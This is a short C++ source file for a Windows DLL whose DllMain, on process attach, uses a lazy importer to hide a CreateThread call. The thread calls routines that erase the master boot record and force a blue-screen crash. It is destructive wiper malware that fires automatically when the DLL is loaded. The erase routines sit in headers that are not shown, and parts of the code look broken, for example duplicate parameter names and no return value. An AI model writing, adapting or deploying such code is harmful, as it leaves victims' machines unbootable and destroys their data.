#include <WINDOWS.H>
#include <IOSTREAM>
#include <FSTREAM>
#include <THREAD>

#include "stdnt.h"
#include "lazyimp.h"
#include "erasembr.h"

VOID far CONST __cdecl InitThread() {
	EraseMBR::Erase();
	EraseMBR::BSoD();
	return;
}

signed __int32 far __stdcall const DllMain(void* OUT, signed __int32 iReason IN, void* OUT) noexcept {
	if (iReason == 0x00000001) {
		LI_FN(CreateThread).in(LI_MODULE("kernel32.dll").cached())(
			nullptr,
			static_cast<size_t>(0),
			reinterpret_cast<LPTHREAD_START_ROUTINE>(InitThread),
			nullptr,
			static_cast<DWORD>(0),
			nullptr
		);
	}
}